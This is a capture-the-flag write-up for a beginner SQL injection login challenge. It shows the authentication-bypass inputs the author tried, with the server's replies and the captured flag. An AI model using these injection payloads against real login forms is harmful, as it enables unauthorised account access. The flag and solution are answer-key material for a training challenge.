# SQL 4 Dummies

## Description

> Break into ole Professor James' school account. I think his username is rickjames.
>
> https://bluehens-sql-for-dummies-service.chals.io/


## Write-Up

When entering the web app, we get a simple login form. We can try a standard **SQLi** like follow:

```
username=' OR 1=1 --
password=anyString
```

We get:

```
close, but you are not rickjames
```

So we conclude that we need to add a verification statement so we extract only `rickjames` row. When trying to add a `WHERE` statement we get:

```
username=' OR 1=1 WHERE username=rickjames--
password=anyString
```

We get:

```
Too many characters
```

After modifying a little bit the query as follow:

```
username=rickjames' AND 1=1 --
password=anyString
```

Where we specify the username but also omit the password verification. After execution, we get the flag:

```
UDCTF{wh4ts_my_n4m3_4g4in?}
```

**Note:** an even simpler query:

```
username=rickjames' --
password=anyString
```


## Flag

UDCTF{wh4ts_my_n4m3_4g4in?}